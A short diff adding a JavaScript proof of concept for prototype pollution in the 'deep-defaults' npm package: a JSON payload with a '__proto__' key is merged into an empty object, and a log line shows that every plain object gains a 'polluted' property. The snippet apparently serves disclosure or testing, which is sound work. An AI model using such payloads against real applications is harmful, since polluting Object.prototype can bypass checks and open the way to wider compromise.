@@ -1,0 +1,12 @@
+```javascript
+const deepDefaults = require("deep-defaults");
+
+// Prototype pollution via _deepDefaults: JSON.parse produces an own
+// "__proto__" key, which _deepDefaults happily recurses into since it
+// resolves to the real Object.prototype (a plain object) on dest.
+const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
+
+deepDefaults({}, payload);
+
+console.log("polluted:", ({}).polluted); // -> "yes", proving global pollution
+```
